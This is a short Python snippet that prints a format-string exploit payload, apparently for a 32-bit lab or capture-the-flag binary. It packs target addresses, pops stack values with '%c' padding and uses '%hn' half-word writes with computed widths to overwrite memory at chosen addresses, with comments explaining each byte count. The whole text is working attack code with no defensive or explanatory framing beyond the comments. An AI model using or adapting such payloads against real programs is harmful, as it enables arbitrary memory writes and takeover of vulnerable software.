print("\x12\x98\x04\x08" +  # first address
      "\x10\x98\x04\x08" +  # checkpoint
      "\x10\x98\x04\x08" +  # second address (real)
      "%c" * 10 +           # pop 10 variables off the stack
      "%236u" +             # writes the 236 left
      "%hn" +               # writes 258 to the addr 
      "%21570p" +           # writes the 21570 left
      "%hn"
      )